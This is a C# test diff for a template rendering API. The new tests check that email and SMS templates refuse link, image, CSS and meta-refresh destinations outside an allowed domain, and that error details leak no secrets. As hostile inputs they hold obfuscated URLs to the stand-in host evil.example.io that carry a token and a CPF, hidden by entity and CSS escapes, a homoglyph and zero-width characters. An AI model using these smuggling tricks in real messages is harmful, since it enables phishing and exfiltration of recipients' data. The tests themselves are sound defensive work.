@@ -221,6 +221,372 @@ public sealed class RenderTemplateVersionEndpointTests(TemplateManagementApiFixt
     }
 
     [RequiresDockerFact]
+    public async Task A_foreign_image_destination_composed_from_string_fragments_is_refused_after_render()
+    {
+        HttpClient client = fixture.CreateAuthorClient("author-1");
+        var key = await TemplateApi.CreateTemplateAsync(
+            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
+        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
+        etag = await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
+        {
+            subject = "Atualização",
+            body = """<img src="{{ scheme }}{{ separator }}{{ first }}{{ second }}{{ suffix }}/pixel?token={{ token }}&amp;cpf={{ cpf }}">""",
+            bodyText = "Atualização disponível.",
+        }, etag);
+        await TemplateApi.PutSchemaAsync(client, key, version, new
+        {
+            type = "object",
+            properties = new
+            {
+                scheme = new { type = "string" },
+                separator = new { type = "string" },
+                first = new { type = "string" },
+                second = new { type = "string" },
+                suffix = new { type = "string" },
+                token = new { type = "string" },
+                cpf = new { type = "string" },
+            },
+        }, etag);
+
+        HttpResponseMessage response = await client.PostAsJsonAsync(
+            $"/v1/templates/{key}/versions/{version}/render",
+            new
+            {
+                channel = "email",
+                locale = "pt-BR",
+                variables = new
+                {
+                    scheme = "HtTpS",
+                    separator = "://",
+                    first = "evil",
+                    second = ".example",
+                    suffix = ".io",
+                    token = "tok_personal_123",
+                    cpf = "123.456.789-09",
+                },
+            });
+
+        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
+        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
+        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
+        var detail = problem.GetProperty("detail").GetString()!;
+        detail.ShouldContain("evil.example.io");
+        detail.ShouldNotContain("token=");
+        detail.ShouldNotContain("tok_personal_123");
+        detail.ShouldNotContain("123.456.789-09");
+
+        HttpResponseMessage allowed = await client.PostAsJsonAsync(
+            $"/v1/templates/{key}/versions/{version}/render",
+            new
+            {
+                channel = "email",
+                locale = "pt-BR",
+                variables = new
+                {
+                    scheme = "HTTPS",
+                    separator = "://",
+                    first = "assets.montebravo",
+                    second = ".com",
+                    suffix = ".br",
+                    token = "safe",
+                    cpf = "masked",
+                },
+            });
+
+        allowed.StatusCode.ShouldBe(HttpStatusCode.OK);
+        JsonElement allowedBody = await TemplateApi.ReadJsonAsync(allowed);
+        allowedBody.GetProperty("body").GetString()!.ShouldContain("assets.montebravo.com.br");
+    }
+
+    [RequiresDockerFact]
+    public async Task A_foreign_anchor_destination_composed_by_the_layout_is_refused_after_render()
+    {
+        HttpClient client = fixture.CreateAuthorClient("author-1");
+        (var layoutKey, var layoutVersion) = await LayoutApi.CreatePublishableDraftAsync(
+            client,
+            body: """
+                <html><a href="HTTPS&#58;//evil.{{ content }}.io/pay?token=layout_secret&amp;cpf=123.456.789-09">abrir</a></html>
+                """,
+            bodyText: "{{ content }}");
+        var key = await TemplateApi.CreateTemplateAsync(
+            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
+        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
+        etag = await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
+        {
+            subject = "Atualização",
+            body = "{{ segment }}",
+            bodyText = "{{ segment }}",
+        }, etag);
+        etag = await TemplateApi.PutSchemaAsync(client, key, version, new
+        {
+            type = "object",
+            properties = new { segment = new { type = "string" } },
+        }, etag);
+        HttpResponseMessage pinned = await client.SendAsync(TemplateApi.PutJson(
+            $"/v1/templates/{key}/versions/{version}/layout",
+            new { layoutKey, layoutVersion },
+            etag));
+        pinned.EnsureSuccessStatusCode();
+
+        HttpResponseMessage response = await client.PostAsJsonAsync(
+            $"/v1/templates/{key}/versions/{version}/render",
+            new
+            {
+                channel = "email",
+                locale = "pt-BR",
+                variables = new { segment = "example" },
+            });
+
+        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
+        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
+        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
+        var detail = problem.GetProperty("detail").GetString()!;
+        detail.ShouldContain("evil.example.io");
+        detail.ShouldNotContain("layout_secret");
+        detail.ShouldNotContain("123.456.789-09");
+    }
+
+    [RequiresDockerFact]
+    public async Task A_unicode_destination_composed_entirely_by_the_layout_is_refused_after_render()
+    {
+        HttpClient client = fixture.CreateAuthorClient("author-1");
+        (var layoutKey, var layoutVersion) = await LayoutApi.CreatePublishableDraftAsync(
+            client,
+            body: """
+                <html><a h{{ "ref" }}="{{ "https" }}{{ ":" }}{{ "/" }}{{ "/" }}{{ content }}/pay?token=layout_secret&amp;cpf=123.456.789-09">abrir</a></html>
+                """,
+            bodyText: "{{ content }}");
+        var key = await TemplateApi.CreateTemplateAsync(
+            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
+        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
+        etag = await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
+        {
+            subject = "Atualização",
+            body = "{{ first }}{{ suffix }}",
+            bodyText = "Atualização disponível.",
+        }, etag);
+        etag = await TemplateApi.PutSchemaAsync(client, key, version, new
+        {
+            type = "object",
+            properties = new
+            {
+                first = new { type = "string" },
+                suffix = new { type = "string" },
+            },
+        }, etag);
+        HttpResponseMessage pinned = await client.SendAsync(TemplateApi.PutJson(
+            $"/v1/templates/{key}/versions/{version}/layout",
+            new { layoutKey, layoutVersion },
+            etag));
+        pinned.EnsureSuccessStatusCode();
+
+        HttpResponseMessage response = await client.PostAsJsonAsync(
+            $"/v1/templates/{key}/versions/{version}/render",
+            new
+            {
+                channel = "email",
+                locale = "pt-BR",
+                variables = new
+                {
+                    first = "аpple",
+                    suffix = ".com",
+                },
+            });
+
+        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
+        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
+        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
+        var detail = problem.GetProperty("detail").GetString()!;
+        detail.ShouldContain("xn--pple-43d.com");
+        detail.ShouldNotContain("layout_secret");
+        detail.ShouldNotContain("123.456.789-09");
+    }
+
+    [RequiresDockerFact]
+    public async Task A_css_destination_escaped_and_composed_by_the_layout_is_refused_after_render()
+    {
+        HttpClient client = fixture.CreateAuthorClient("author-1");
+        (var layoutKey, var layoutVersion) = await LayoutApi.CreatePublishableDraftAsync(
+            client,
+            body: """
+                <html><div style="background-image:u{{ "rl" }}(\68 \74 \74 \70 \73 \3a \2f \2f \65 vil\2e {{ content }}\2e io/pay?token=layout_secret&amp;cpf=123.456.789-09)">conteúdo</div></html>
+                """,
+            bodyText: "{{ content }}");
+        var key = await TemplateApi.CreateTemplateAsync(
+            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
+        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
+        etag = await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
+        {
+            subject = "Atualização",
+            body = "{{ segment }}",
+            bodyText = "Atualização disponível.",
+        }, etag);
+        etag = await TemplateApi.PutSchemaAsync(client, key, version, new
+        {
+            type = "object",
+            properties = new { segment = new { type = "string" } },
+        }, etag);
+        HttpResponseMessage pinned = await client.SendAsync(TemplateApi.PutJson(
+            $"/v1/templates/{key}/versions/{version}/layout",
+            new { layoutKey, layoutVersion },
+            etag));
+        pinned.EnsureSuccessStatusCode();
+
+        HttpResponseMessage response = await client.PostAsJsonAsync(
+            $"/v1/templates/{key}/versions/{version}/render",
+            new
+            {
+                channel = "email",
+                locale = "pt-BR",
+                variables = new { segment = "example" },
+            });
+
+        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
+        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
+        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
+        var detail = problem.GetProperty("detail").GetString()!;
+        detail.ShouldContain("evil.example.io");
+        detail.ShouldNotContain("layout_secret");
+        detail.ShouldNotContain("123.456.789-09");
+    }
+
+    [RequiresDockerFact]
+    public async Task An_escaped_css_function_and_html5_destination_created_by_the_layout_is_refused()
+    {
+        HttpClient client = fixture.CreateAuthorClient("author-1");
+        (var layoutKey, var layoutVersion) = await LayoutApi.CreatePublishableDraftAsync(
+            client,
+            body: """
+                <html><div style="background:\{{ "75" }}\72\6c(\68\74\74\70\73&colon;&sol;&sol;\65 vil&period;{{ content }}&period;io/pay?token=layout_secret&amp;cpf=123.456.789-09)">conteúdo</div></html>
+                """,
+            bodyText: "{{ content }}");
+        var key = await TemplateApi.CreateTemplateAsync(
+            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
+        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
+        etag = await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
+        {
+            subject = "Atualização",
+            body = "{{ segment }}",
+            bodyText = "Atualização disponível.",
+        }, etag);
+        etag = await TemplateApi.PutSchemaAsync(client, key, version, new
+        {
+            type = "object",
+            properties = new { segment = new { type = "string" } },
+        }, etag);
+        HttpResponseMessage pinned = await client.SendAsync(TemplateApi.PutJson(
+            $"/v1/templates/{key}/versions/{version}/layout",
+            new { layoutKey, layoutVersion },
+            etag));
+        pinned.EnsureSuccessStatusCode();
+
+        HttpResponseMessage response = await client.PostAsJsonAsync(
+            $"/v1/templates/{key}/versions/{version}/render",
+            new
+            {
+                channel = "email",
+                locale = "pt-BR",
+                variables = new { segment = "example" },
+            });
+
+        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
+        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
+        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
+        var detail = problem.GetProperty("detail").GetString()!;
+        detail.ShouldContain("evil.example.io");
+        detail.ShouldNotContain("layout_secret");
+        detail.ShouldNotContain("123.456.789-09");
+    }
+
+    [RequiresDockerFact]
+    public async Task A_meta_refresh_destination_created_by_the_layout_is_refused_after_render()
+    {
+        HttpClient client = fixture.CreateAuthorClient("author-1");
+        (var layoutKey, var layoutVersion) = await LayoutApi.CreatePublishableDraftAsync(
+            client,
+            body: """
+                <html><m{{ "eta" }} CONTENT="0; URL=https&colon;&sol;&sol;evil&period;{{ content }}&period;io/pay?token=layout_secret&amp;cpf=123.456.789-09" HTTP-EQUIV="ReFrEsH"></html>
+                """,
+            bodyText: "{{ content }}");
+        var key = await TemplateApi.CreateTemplateAsync(
+            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
+        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
+        etag = await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
+        {
+            subject = "Atualização",
+            body = "{{ segment }}",
+            bodyText = "Atualização disponível.",
+        }, etag);
+        etag = await TemplateApi.PutSchemaAsync(client, key, version, new
+        {
+            type = "object",
+            properties = new { segment = new { type = "string" } },
+        }, etag);
+        HttpResponseMessage pinned = await client.SendAsync(TemplateApi.PutJson(
+            $"/v1/templates/{key}/versions/{version}/layout",
+            new { layoutKey, layoutVersion },
+            etag));
+        pinned.EnsureSuccessStatusCode();
+
+        HttpResponseMessage response = await client.PostAsJsonAsync(
+            $"/v1/templates/{key}/versions/{version}/render",
+            new
+            {
+                channel = "email",
+                locale = "pt-BR",
+                variables = new { segment = "example" },
+            });
+
+        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
+        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
+        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
+        var detail = problem.GetProperty("detail").GetString()!;
+        detail.ShouldContain("evil.example.io");
+        detail.ShouldNotContain("layout_secret");
+        detail.ShouldNotContain("123.456.789-09");
+    }
+
+    [RequiresDockerFact]
+    public async Task A_foreign_destination_revealed_by_sms_normalization_is_refused()
+    {
+        HttpClient client = fixture.CreateAuthorClient("author-1");
+        var key = await TemplateApi.CreateTemplateAsync(
+            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
+        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
+        etag = await TemplateApi.PutContentAsync(
+            client,
+            key,
+            version,
+            "sms/pt-BR",
+            new { body = "{{ destination }}" },
+            etag);
+        await TemplateApi.PutSchemaAsync(client, key, version, new
+        {
+            type = "object",
+            properties = new { destination = new { type = "string" } },
+        }, etag);
+
+        HttpResponseMessage response = await client.PostAsJsonAsync(
+            $"/v1/templates/{key}/versions/{version}/render",
+            new
+            {
+                channel = "sms",
+                locale = "pt-BR",
+                variables = new
+                {
+                    destination =
+                        "H\u200Dt\u200DT\u200Dp\u200DS:/\u200D/e\u200Dv\u200Di\u200Dl."
+                        + "e\u200Dx\u200Da\u200Dm\u200Dp\u200Dl\u200De.i\u200Do",
+                },
+            });
+
+        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
+        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
+        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
+        problem.GetProperty("detail").GetString()!.ShouldContain("evil.example.io");
+    }
+
+    [RequiresDockerFact]
     public async Task A_missing_variable_returns_400_render_failed()
     {
         HttpClient client = fixture.CreateAuthorClient("author-1");
